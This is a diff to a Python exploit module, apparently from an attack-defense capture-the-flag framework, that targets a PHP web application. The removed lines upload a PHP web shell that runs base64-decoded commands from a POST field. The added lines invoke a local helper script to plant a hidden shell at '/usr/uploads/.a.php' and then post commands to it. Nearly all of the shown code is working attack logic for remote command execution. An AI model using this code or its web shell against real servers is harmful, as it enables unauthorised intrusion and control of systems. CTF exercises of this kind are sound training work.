@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import requests,re
+import requests,re,os
 from framework.http import http
 from framework.config import *
 from framework.function import *
@@ -18,7 +18,7 @@ def vulnerable_attack(target,target_port,cmd):
     '''
 
     try:
-        data = cmd 
+        data = cmd
         #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
 	res = shit(target,target_port,data)
         # Even though we can not execute the cmd with the vuln, but we can read flag
@@ -33,35 +33,11 @@ def vulnerable_attack(target,target_port,cmd):
 
 def shit(target,target_port,cmd):
     s = requests.Session()
-    ip = target
-    url_1 = 'http://%s:%s/index.php/user/upFiles/upload' % (ip,str(target_port))
-    
-    my_hash = hashlib.md5(str(randint(1,10000000))).hexdigest()[:8]
-    shell = "<?php system(base64_decode($_POST['%s']));?>" % my_hash
-    open('/tmp/a.php','w').write(shell)
-
-    files = {'file':open('/tmp/a.php','r')}
-    headers = {"X-Requested-With": "XMLHttpRequest"}
-    print url_1
-    content = s.post(url_1,files=files,headers=headers).content
-    import json
-    
-    try:
-        path = '/public' + json.loads(content)['url']
-    except:
-        return 'error'
-
-       
-    url_2 = 'http://%s:%s/' % (ip,str(target_port))
-    url_2 += path
-
-    print url_2
-
-    final_url = url_2
-    print final_url
-    res = s.post(final_url,data={my_hash:quote(base64.b64encode(cmd))}).content
-
+    url_1 = 'http://%s:%s' % (target,str(target_port))
+    shell_hash = '_' + hashlib.md5(str(time.time()) + url_1).hexdigest()[0:8]
+    res = os.popen('python ./not_use/ser.py %s %s'%(url_1,shell_hash)).read()
     print res
 
-
+    url_2 = url_1 + '/usr/uploads/.a.php'
+    res = s.post(url_2,data={shell_hash:cmd}).content
     return res
